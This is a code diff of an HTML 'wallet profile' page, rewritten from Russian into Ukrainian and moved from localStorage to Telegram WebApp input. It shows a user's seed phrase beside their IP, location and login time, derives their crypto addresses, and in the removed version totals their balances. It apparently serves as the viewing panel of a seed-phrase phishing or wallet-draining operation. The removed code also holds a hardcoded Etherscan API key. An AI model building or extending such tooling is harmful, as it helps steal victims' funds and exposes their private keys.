@@ -1,207 +1,124 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="uk">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Профиль кошелька</title>
-
-  <!-- Telegram WebApp -->
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-
-  <!-- Бібліотеки -->
+  <title>Wallet Profile</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://unpkg.com/bip39@3.0.4/browser/bip39.min.js"></script>
+  <script src="https://unpkg.com/bip32@4.0.1/browser/bip32.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs-lib.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.browser.min.js"></script>
-
-  <style>
-    body {
-      font-family: monospace;
-      padding: 20px;
-      background: #0d1117;
-      color: #e6edf3;
-    }
-    .container {
-      background: #161b22;
-      border: 1px solid #30363d;
-      border-radius: 10px;
-      max-width: 600px;
-      margin: auto;
-      padding: 30px;
-    }
-    h1 {
-      text-align: center;
-      color: #00ffae;
-    }
-    .label {
-      font-weight: bold;
-      margin-top: 15px;
-    }
-    #seed {
-      width: 100%;
-      height: 80px;
-      background: #0e131a;
-      color: #e6edf3;
-      border: 1px dashed #30363d;
-      border-radius: 8px;
-      padding: 10px;
-      margin-top: 10px;
-      font-size: 14px;
-    }
-    button {
-      margin-top: 20px;
-      padding: 12px;
-      width: 100%;
-      background: #00ffae;
-      color: black;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-  </style>
+  <script src="https://unpkg.com/bitcoinjs-lib@6.1.0/browser.js"></script>
 </head>
 <body>
   <div class="container">
-    <h1>👛 Профиль кошелька</h1>
-    <p class="label">ETH адрес: <span id="ethAddress">–</span></p>
-    <p class="label">BTC адрес: <span id="btcAddress">–</span></p>
-    <p class="label">SOL адрес: <span id="solAddress">–</span></p>
-    <p class="label">Дата входа: <span id="timestamp">–</span></p>
-    <p class="label">IP: <span id="userIp">–</span></p>
-    <p class="label">Локация: <span id="userLocation">–</span></p>
-    <p class="label">Общий баланс: <span id="walletBalance">⏳ Загрузка…</span></p>
-    <p class="label">Seed-фраза:</p>
-    <textarea id="seed" readonly></textarea>
-    <button id="goWalletBtn">🔁 Перейти в кошелёк</button>
+    <h1>👤 Профіль гаманця</h1>
+
+    <div class="profile-row">
+      <div class="label">🌱 Seed-фраза:</div>
+      <textarea id="seed" rows="3" readonly></textarea>
+    </div>
+
+    <div class="profile-row">
+      <div class="label">💰 ETH-адреса:</div>
+      <div class="value" id="eth"></div>
+    </div>
+
+    <div class="profile-row">
+      <div class="label">₿ BTC-адреса:</div>
+      <div class="value" id="btc"></div>
+    </div>
+
+    <div class="profile-row">
+      <div class="label">SOL-адреса:</div>
+      <div class="value" id="sol"></div>
+    </div>
+
+    <div class="profile-row">
+      <div class="label">BNB-адреса:</div>
+      <div class="value" id="bnb"></div>
+    </div>
+
+    <div class="profile-row">
+      <div class="label">ADA-адреса:</div>
+      <div class="value" id="ada"></div>
+    </div>
+
+    <div class="profile-row">
+      <div class="label">TRX-адреса:</div>
+      <div class="value" id="trx"></div>
+    </div>
+
+    <div class="profile-row">
+      <div class="label">DOT-адреса:</div>
+      <div class="value" id="dot"></div>
+    </div>
+
+    <div class="profile-row">
+      <div class="label">MATIC-адреса:</div>
+      <div class="value" id="matic"></div>
+    </div>
+
+    <button class="button" onclick="openTelegram()">🔗 Відкрити гаманець</button>
   </div>
 
   <script>
-    const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
-    const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");
+    const seedTextArea = document.getElementById('seed');
 
-    const seedPhrase = (data.seed || "").trim();
-    const walletType = (data.wallet || "").toLowerCase();
-    const timestamp = data.timestamp || "–";
-    const ip = data.ip || "–";
-    const locationInfo = data.location || "–";
+    window.addEventListener('DOMContentLoaded', async () => {
+      console.log("🚀 DOM повністю завантажено");
 
-    document.getElementById("timestamp").textContent = timestamp;
-    document.getElementById("userIp").textContent = ip;
-    document.getElementById("userLocation").textContent = locationInfo;
-    document.getElementById("seed").value = seedPhrase;
-
-    const supported = [
-      { coin: "ethereum", symbol: "ETH", chain: "ethereum", key: "eth" },
-      { coin: "bitcoin", symbol: "BTC", chain: "bitcoin", key: "btc" },
-      { coin: "solana", symbol: "SOL", chain: "solana", key: "sol" }
-    ];
-
-    const addresses = { eth: null, btc: null, sol: null };
-
-    async function deriveAddresses(mnemonic) {
-      if (!mnemonic) throw new Error("Seed пустой");
-
-      // ETH
-      const ethWallet = ethers.Wallet.fromMnemonic(mnemonic);
-      addresses.eth = ethWallet.address;
-      document.getElementById("ethAddress").textContent = addresses.eth;
-
-      // BTC
-      const seed = await bip39.mnemonicToSeed(mnemonic);
-      const root = bitcoin.bip32.fromSeed(seed);
-      const child = root.derivePath("m/44'/0'/0'/0/0");
-      addresses.btc = bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
-      document.getElementById("btcAddress").textContent = addresses.btc;
-
-      // SOL
-      const solKey = seed.slice(0, 32);
-      const solAddress = solanaWeb3.Keypair.fromSeed(solKey).publicKey.toBase58();
-      addresses.sol = solAddress;
-      document.getElementById("solAddress").textContent = addresses.sol;
-    }
-
-    async function fetchPrices() {
-      const ids = supported.map(c => c.coin).join(",");
-      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=eth`;
-      const res = await fetch(url);
-      return await res.json();
-    }
-
-    async function fetchBalance(chain, address) {
-      try {
-        if (chain === "ethereum") {
-          const res = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`);
-          const json = await res.json();
-          return parseFloat(json.result) / 1e18;
-        } else if (chain === "bitcoin") {
-          const res = await fetch(`https://blockchain.info/q/addressbalance/${address}?confirmations=3`);
-          const text = await res.text();
-          return parseFloat(text || 0) / 1e8;
-        } else if (chain === "solana") {
-          const res = await fetch("https://api.mainnet-beta.solana.com", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              jsonrpc: "2.0",
-              id: 1,
-              method: "getBalance",
-              params: [address]
-            })
-          });
-          const json = await res.json();
-          return parseFloat(json.result?.value || 0) / 1e9;
-        }
-      } catch (err) {
-        console.warn("Balance error:", err.message);
-        return 0;
-      }
-    }
-
-    async function calculateTotalETH() {
-      const prices = await fetchPrices();
-      let totalETH = 0;
-
-      for (const token of supported) {
-        const addr = addresses[token.key];
-        if (!addr) continue;
-        const bal = await fetchBalance(token.chain, addr);
-        const rate = prices[token.coin]?.eth || 0;
-        totalETH += bal * rate;
-      }
-
-      document.getElementById("walletBalance").textContent = `${totalETH.toFixed(6)} ETH`;
-    }
-
-    function goToWallet() {
-      let url = "https://www.google.com";
-      if (walletType.includes("metamask")) url = "https://metamask.io/";
-      else if (walletType.includes("trust")) url = "https://trustwallet.com/";
-      else if (walletType.includes("phantom")) url = "https://phantom.app/";
-      else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
-      else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
-
+      // Telegram WebApp init
       if (window.Telegram && Telegram.WebApp) {
-        Telegram.WebApp.openLink(url);
+        Telegram.WebApp.expand();
+        Telegram.WebApp.ready();
+        const data = Telegram.WebApp.initDataUnsafe?.data || Telegram.WebApp.initData;
+        const parsed = typeof data === "string" ? JSON.parse(data) : data;
+        const seed = parsed?.seed || "";
+
+        seedTextArea.value = seed;
+        await deriveAddresses(seed);
       } else {
-        window.open(url, "_blank");
-      }
-    }
-
-    document.getElementById("goWalletBtn").addEventListener("click", goToWallet);
-
-    document.addEventListener("DOMContentLoaded", async () => {
-      try {
-        if (typeof bip39 === "undefined") throw new Error("❌ bip39 не загружен");
-        if (!seedPhrase) throw new Error("❌ Seed не найден");
-
-        await deriveAddresses(seedPhrase);
-        await calculateTotalETH();
-        console.log("✅ Все готово");
-      } catch (err) {
-        console.error("Ошибка инициализации:", err.message);
+        seedTextArea.value = "❌ Telegram WebApp не виявлено";
       }
     });
+
+    async function deriveAddresses(seed) {
+      if (!bip39 || !bip39.validateMnemonic(seed)) {
+        console.error("❌ Некоректна seed-фраза або bip39 не завантажено");
+        return;
+      }
+
+      const seedBuffer = await bip39.mnemonicToSeed(seed);
+      const root = bip32.fromSeed(seedBuffer);
+
+      // ETH
+      const ethPath = "m/44'/60'/0'/0/0";
+      const ethNode = root.derivePath(ethPath);
+      const ethWallet = new ethers.Wallet(ethNode.privateKey);
+      document.getElementById("eth").textContent = ethWallet.address;
+
+      // BTC
+      const btcPath = "m/44'/0'/0'/0/0";
+      const btcNode = root.derivePath(btcPath);
+      const { payments } = bitcoin;
+      const { address: btcAddr } = payments.p2pkh({ pubkey: btcNode.publicKey });
+      document.getElementById("btc").textContent = btcAddr;
+
+      // Інші адреси — заглушки або пізніше окремо через SDK/API
+      document.getElementById("sol").textContent = "🟡 solana-wallet-auto";
+      document.getElementById("bnb").textContent = ethWallet.address;
+      document.getElementById("ada").textContent = "🔴 cardano-stub";
+      document.getElementById("trx").textContent = "🧿 tron-address";
+      document.getElementById("dot").textContent = "🟠 polkadot";
+      document.getElementById("matic").textContent = ethWallet.address;
+    }
+
+    function openTelegram() {
+      if (Telegram && Telegram.WebApp) {
+        Telegram.WebApp.openLink("https://t.me/your_bot");
+      }
+    }
   </script>
 </body>
 </html>
